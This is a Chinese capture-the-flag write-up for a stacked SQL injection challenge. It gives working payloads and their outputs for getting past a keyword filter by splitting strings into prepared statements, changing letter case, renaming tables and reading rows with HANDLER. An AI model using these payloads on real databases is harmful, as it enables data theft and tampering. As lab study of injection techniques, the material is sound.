#SQL 注入 #堆叠注入

---

```
?inject=1' or 1=1%23
```

回显，存在注入点
存在过滤

```
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

尝试堆叠注入

```
?inject=1'; show databases;#
```

无报错

```
?inject=1'; show tables;#

array(1) {
  [0]=>
  string(16) "1919810931114514"
}

array(1) {
  [0]=>
  string(5) "words"
}
}
```

继续查看表

```
?inject=1'; show columns from `1919810931114514`;#

array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```

```
?inject=1'; show columns from `words`;#

array(6) {
  [0]=>
  string(2) "id"
  [1]=>
  string(7) "int(10)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}

array(6) {
  [0]=>
  string(4) "data"
  [1]=>
  string(11) "varchar(20)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```

关于在这里使用 反引号 而不是 ' 的一些解释：
两者在 linux 下和 windows 下不同，linux 下不区分，windows 下区分。
单引号 '' 或双引号主要用于 字符串的引用符号
反勾号 数据库、表、索引、列和别名用的是引用符是反勾号 (注：Esc 下面的键)
有 MYSQL 保留字作为字段的，必须加上反引号来区分！！！
如果是数值，请不要使用引号。

原题目查询的数据表为 `words` 。既然没过滤 `alert` 和 `rename`，那就可以把表和列改名。先把 `words` 改为其他，再把`1919810931114514`改为 `words`，然后把新的 `words` 表里的 `flag` 列改为 `id` ，这样就可以直接查询 flag 了

## 方法一：绕过 select

如果无法使用 select，还是获得不了 flag，可以通过预编译的方式绕过对 select 的限制。

SQL 语句的执行处理

1. 即时 SQL  
   　一条 SQL 在 DB 接收到最终执行完毕返回，大致的过程如下：
   　 1. 词法和语义解析；  
   　 2. 优化 SQL 语句，制定执行计划；  
   　 3. 执行并返回结果；  
   如上，一条 SQL 直接是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL）。

2、预处理 SQL  
 但是，绝大多数情况下，某需求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。

所谓预编译语句就是将此类 SQL 语句中的值用占位符替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫 Prepared Statements。

预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。

预处理流程

```sql
SET;									# 用于设置变量名和值
PREPARE stmt_name FROM preparable_stmt;	# 用于预备一个语句，并赋予名称，以后可以引用该语句
EXECUTE stmt_name;			 			# 执行语句
{DEALLOCATE | DROP} PREPARE stmt_name;	# 用来释放掉预处理的语句
```

构建 payload:

```sql
-1';
set @sql=CONCAT('se','lect * from `1919810931114514`;');
prepare stmt from @sql;
execute stmt;
```

```php
[OUTPUT]: strstr($inject, "set") && strstr($inject, "prepare")
```

暗示 `set` 与 `prepare` 关键词被拦截，但是 `strstr` 函数对大小写敏感，尝试使用大写绕过：

```php
array(1) {
  [0]=>
  string(38) "flag{c168d583ed0d4d7196967b28cbd0b5e9}"
}
```

获得 flag

## 方法二： 修改表名

原题目查询的数据表为 `words` 。既然没过滤 `alert` 和 `rename`，那就可以把表和列改名。先把 `words` 改为其他，再把 `1919810931114514` 改为 `words`，然后把新的 `words` 表里的 `flag` 列改为 `id` ，这样就可以直接查询 flag 了

payload 如下：

```sql
-1';
rename table `words` to `test`;
rename table `1919810931114514` to `words`;
alter table `words` change `flag` `id` varchar(100);
show columns from words;--+
# ALTER TABLE tiger (表名) CHANGE tigername(要修改的列) name (修改后的列名) VARCHAR(20)(类型);
```

使用 `/?inject=1' or 1='1` 访问一下即可获得 flag

## 方法三： handler

mysql 除可使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过 handler 语句并不具备 select 语句的所有功能。它是 mysql 专用的语句，并没有包含到 SQL 标准中。

```sql
HANDLER tbl_name OPEN [ [AS] alias]
# 打开一张表，无返回结果，实际上声明了一个名为tb1_name的句柄。
HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ { FIRST | NEXT }
    [ WHERE where_condition ] [LIMIT ... ]
# 获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。
HANDLER tbl_name CLOSE
# 关闭打开的句柄。
```

使用 payload：

```sql
1';
handler `1919810931114514` open;
handler `1919810931114514` read first;-- +
```

# 最后

原题目因为使用`multi_query()`执行一条或多条`sql`语句，然后将结果全部输出，才会出现这种漏洞。

MySQL 中反引号和单引号的区别与用法

1.  MySql 中用一对反引号来标注 SQL 语句中的标识，如**数据库名、表名、字段名**等
2.  引号则用来标注语句中所引用的字符型常量或日期/时间型常量，即**字段值**  
    例如：

```sql
select * from `username` where `name`="peri0d"
```

[[强网杯 2019]随便注 - chalan630 - 博客园 (cnblogs.com)](https://www.cnblogs.com/chalan630/p/12583667.html)
